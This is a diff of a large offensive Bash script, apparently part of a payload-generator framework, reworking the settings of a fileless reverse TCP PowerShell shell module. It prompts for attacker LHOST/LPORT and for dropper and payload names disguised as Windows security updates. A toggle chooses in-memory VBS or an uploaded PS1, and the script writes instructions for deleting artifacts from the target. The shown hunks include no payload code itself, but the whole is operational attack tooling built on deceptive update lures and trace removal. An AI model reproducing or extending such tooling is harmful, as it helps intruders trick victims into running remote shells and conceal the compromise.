@@ -12017,8 +12017,8 @@ lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --wid
 lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
 Drop=$(zenity --title="☠ Enter DROPPER NAME ☠" --text "example: Update-KB4524147\nWarning: Allways Start FileNames With [Capital Letters]" --entry --width 300) > /dev/null 2>&1
 NaM=$(zenity --title="☠ Enter PAYLOAD NAME ☠" --text "example: Security-Update\nWarning: Allways Start FileNames With [Capital Letters]" --entry --width 300) > /dev/null 2>&1
-if [ "$easter_egg" = "OFF" ] || [ "$easter_egg" = "off" ]; then
-   rpath=$(zenity --title="☠ Enter Payload Upload Path (target dir) ☠" --text "example: tmp\nexample: LocalAppData (*)\nexample: userprofile\\\\\\\Desktop\n\n(*) Recomended Path For Payload Upload.\nRemark: Only PS environment var's accepted!" --entry --width 350) > /dev/null 2>&1
+if [ "$easter_egg" = "ON" ] || [ "$easter_egg" = "on" ]; then
+   rpath=$(zenity --title="☠ 'Silent Execution' script Upload Path (target dir) ☠" --text "example: tmp\nexample: LocalAppData (*)\nexample: userprofile\\\\\\\Desktop\n\n(*) Recomended Path For 'Silent Execution' Upload.\nRemark: Only PS environment var's accepted!" --entry --width 350) > /dev/null 2>&1
 fi
 
 
@@ -12031,7 +12031,7 @@ if [ -z "$Drop" ]; then Drop="Update-KB4524147";fi
 
 
 ## Display final settings to user
-if [ "$easter_egg" = "OFF" ] || [ "$easter_egg" = "off" ]; then ext="ps1";tech="$rpath"; else ext="vbs";tech="In-Memory"; fi
+if [ "$easter_egg" = "ON" ] || [ "$easter_egg" = "on" ]; then ext="vbs";tech="In-Memory"; else ext="ps1";tech="\$env:$rpath"; fi
 echo "${BlueF}[${YellowF}i${BlueF}]${white} AMSI MODULE SETTINGS"${Reset};
 echo ${BlueF}"---"
 cat << !
@@ -12164,15 +12164,15 @@ rm -r $ApAcHe/FakeUpdate_files > /dev/nul 2>&1
 rm $ApAcHe/Download.html > /dev/nul 2>&1
 
 ## Build Report File in output folder ..
-if [ "$easter_egg" = "OFF" ] || [ "$easter_egg" = "off" ]; then
+if [ "$easter_egg" = "ON" ] || [ "$easter_egg" = "on" ]; then
+   echo "EXECUTE IN TARGET CMD PROMPT" > $IPATH/output/delete_artifacts_ID_4nF7.txt
+   echo "----------------------------" >> $IPATH/output/delete_artifacts_ID_4nF7.txt
+   echo "del /F /Q $Drop.vbs" >> $IPATH/output/delete_artifacts_ID_4nF7.txt
+else
    echo "EXECUTE IN TARGET CMD PROMPT" > $IPATH/output/delete_artifacts_ID_4nF7.txt
    echo "----------------------------" >> $IPATH/output/delete_artifacts_ID_4nF7.txt
    echo "del /F /Q %$rpath%\\KB4524147_4nF7.ps1" >> $IPATH/output/delete_artifacts_ID_4nF7.txt
    echo "del /F /Q $Drop.ps1" >> $IPATH/output/delete_artifacts_ID_4nF7.txt
-else
-   echo "EXECUTE IN TARGET CMD PROMPT" > $IPATH/output/delete_artifacts_ID_4nF7.txt
-   echo "----------------------------" >> $IPATH/output/delete_artifacts_ID_4nF7.txt
-   echo "del /F /Q $Drop.vbs" >> $IPATH/output/delete_artifacts_ID_4nF7.txt
 fi
 zenity --title="☠ Reverse TCP Powershell Shell (Fileless) ☠" --text "REMARK: Instructions how to manualy delete artifacts from target stored in:\n$IPATH/output/delete_artifacts_ID_4nF7.txt" --info > /dev/null 2>&1
 sh_menu
